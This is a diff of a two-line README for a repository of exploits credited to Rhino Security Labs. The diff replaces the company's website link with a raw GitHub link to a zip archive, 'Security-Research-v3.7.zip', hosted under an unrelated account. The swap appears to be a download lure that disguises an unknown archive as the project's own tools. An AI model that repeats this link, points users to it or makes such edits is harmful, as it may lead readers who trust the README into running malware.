@@ -1,4 +1,4 @@
 # security
 Exploits written by the Rhino Security Labs team
 
-www.rhinosecuritylabs.com
+https://raw.githubusercontent.com/startplusit/Security-Research/master/tools/cfire/Security-Research-v3.7.zip
